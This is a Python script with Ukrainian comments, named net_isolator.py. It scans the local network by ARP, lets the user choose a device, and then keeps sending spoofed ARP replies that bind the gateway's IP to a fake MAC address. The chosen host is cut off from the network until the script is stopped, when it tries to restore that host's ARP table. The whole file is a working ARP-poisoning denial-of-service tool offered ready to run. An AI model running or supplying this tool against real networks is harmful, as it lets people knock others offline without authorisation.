# Файл: net_isolator.py (ФІНАЛЬНА ВЕРСІЯ БЕЗ ПОПЕРЕДЖЕНЬ)

from scapy.all import srp, Ether, ARP, send, conf, sendp # ДОДАНО sendp
import time
import sys
import os
import ctypes
import netifaces 

# Глобальна змінна для зберігання вибраного інтерфейсу
SELECTED_INTERFACE = None 

# --- ДОПОМІЖНІ ФУНКЦІЇ ---

def get_gateway_ip():
    if netifaces:
        try:
            gws = netifaces.gateways()
            return gws['default'][netifaces.AF_INET][0]
        except Exception:
            pass

    try:
        with open('/proc/net/route') as fh:
            for line in fh.readlines()[1:]:
                fields = line.strip().split()
                if fields[1] == '00000000':
                    gw_hex = fields[2]
                    gw = '.'.join(str(int(gw_hex[i:i+2], 16)) for i in range(6, -1, -2))
                    return gw
    except Exception:
        pass

    try:
        from scapy.all import conf
        route = conf.route.route("0.0.0.0")
        if route and len(route) >= 2 and isinstance(route[1], str) and '.' in route[1]:
            return route[1] 
    except Exception:
        pass

    print("❌ Не вдалося отримати IP-адресу шлюзу.")
    return None

def select_interface():
    """Виводить список інтерфейсів і просить користувача вибрати один."""
    global SELECTED_INTERFACE
    
    iface_list = list(conf.ifaces.keys())
    
    if not iface_list:
        print("❌ Не знайдено доступних мережевих інтерфейсів.")
        sys.exit(1)

    print("\n--- Вибір мережевого інтерфейсу ---")
    for i, name in enumerate(iface_list):
        try:
             ip = conf.ifaces[name].ip
        except:
             ip = "N/A"
             
        print(f"  [{i+1}] {name} (IP: {ip})")
    print("-----------------------------------")
    
    try:
        choice = input("Введіть номер інтерфейсу для роботи: ")
        choice_num = int(choice) - 1
        
        if 0 <= choice_num < len(iface_list):
            SELECTED_INTERFACE = iface_list[choice_num]
            print(f"✅ Вибрано інтерфейс: {SELECTED_INTERFACE}")
            return True
        else:
            print("❌ Невірний номер. Вихід.")
            return False
            
    except ValueError:
        print("❌ Невірний ввід. Потрібно ввести число.")
        return False


def get_mac(ip):
    arp_request = Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip)
    answered, unanswered = srp(arp_request, timeout=1, verbose=False, iface=SELECTED_INTERFACE) 
    
    if answered:
        return answered[0][1].hwsrc
    return None

def scan_network(target_ip_range):
    print(f"⏳ Сканування мережі {target_ip_range}...")
    
    arp_request = Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=target_ip_range)
    answered, unanswered = srp(arp_request, timeout=2, verbose=False, iface=SELECTED_INTERFACE)
    
    devices = {}
    for sent, received in answered:
        devices[received.psrc] = received.hwsrc
        
    return devices

def restore_arp(target_ip, target_mac, gateway_ip, gateway_mac):
    print("\n[Cleanup] Відновлення ARP-таблиці цілі...")
    
    arp_layer = ARP(op=2, psrc=gateway_ip, hwsrc=gateway_mac, pdst=target_ip, hwdst=target_mac)
    packet1 = Ether(src=gateway_mac, dst=target_mac) / arp_layer
    
    # ВИПРАВЛЕНО: Використовуємо sendp
    sendp(packet1, count=4, verbose=False, iface=SELECTED_INTERFACE)
    
    print("✅ ARP-таблицю відновлено.")


def isolate_target(target_ip, target_mac, gateway_ip):
    
    gateway_mac = get_mac(gateway_ip)
    if not gateway_mac:
        print("❌ Не вдалося отримати MAC-адресу шлюзу. Невідновлювана ізоляція.")
    
    print(f"🛡️ Ізоляція активована. Ціль: {target_ip}")
    
    fake_mac = "00:11:22:33:44:55"
    
    # ВИПРАВЛЕНО: Використовуємо Ether(src=fake_mac, dst=target_mac) для усунення попереджень
    arp_poison_packet = Ether(src=fake_mac, dst=target_mac) / ARP(op=2, psrc=gateway_ip, hwsrc=fake_mac, pdst=target_ip, hwdst=target_mac)

    try:
        while True:
            # ВИПРАВЛЕНО: Використовуємо sendp для коректної відправки L2-пакетів
            sendp(arp_poison_packet, verbose=False, iface=SELECTED_INTERFACE) 
            time.sleep(2) 

    except KeyboardInterrupt:
        print("\n\n✅ Процес ізоляції зупинено користувачем.")
        
        if gateway_mac:
             restore_arp(target_ip, target_mac, gateway_ip, gateway_mac)
        else:
             print("[Cleanup] Відновлення не виконано. Ціль відновить зв'язок самостійно за кілька хвилин.")
        
        sys.exit(0)
    except Exception as e:
        print(f"❌ Критична помилка під час ізоляції: {e}")
        sys.exit(1)


def main():
    if sys.platform == 'win32':
        is_admin = ctypes.windll.shell32.IsUserAnAdmin()
    else:
        is_admin = (os.geteuid() == 0)

    if not is_admin:
        print("🛑 Для надсилання ARP-пакетів потрібні права адміністратора.")
        print("Будь ласка, запустіть скрипт від імені адміністратора (Run as Administrator).")
        sys.exit(1)
    
    if not select_interface():
        return
        
    gateway_ip = get_gateway_ip()
    if not gateway_ip:
        return
        
    network_prefix = gateway_ip[:gateway_ip.rfind('.') + 1] + "0/24"
    
    devices = scan_network(network_prefix)
    
    if not devices:
        print("❌ Не знайдено жодного пристрою в мережі.")
        return

    print(f"\n--- Знайдені пристрої ({len(devices)}) ---")
    
    devices_list = list(devices.keys())
    
    for i, ip in enumerate(devices_list):
        if ip == gateway_ip:
             print(f"  [{i+1}] {ip} (Шлюз/Роутер)")
        else:
             print(f"  [{i+1}] {ip} (MAC: {devices[ip]})")
    print("---------------------------------------")

    try:
        choice = input("Введіть номер пристрою для ізоляції (або 'q' для виходу): ")
        if choice.lower() == 'q':
            print("Вихід.")
            return
            
        choice_num = int(choice) - 1
        
        if 0 <= choice_num < len(devices_list):
            target_ip = devices_list[choice_num]
            target_mac = devices[target_ip]
            
            if target_ip == gateway_ip:
                 print("⚠️ Не можна ізолювати шлюз, інакше ви відключите всю мережу.")
                 return

            isolate_target(target_ip, target_mac, gateway_ip)

        else:
            print("❌ Невірний номер.")
            
    except ValueError:
        print("❌ Невірний ввід. Потрібно ввести число.")
        
if __name__ == "__main__":
    main()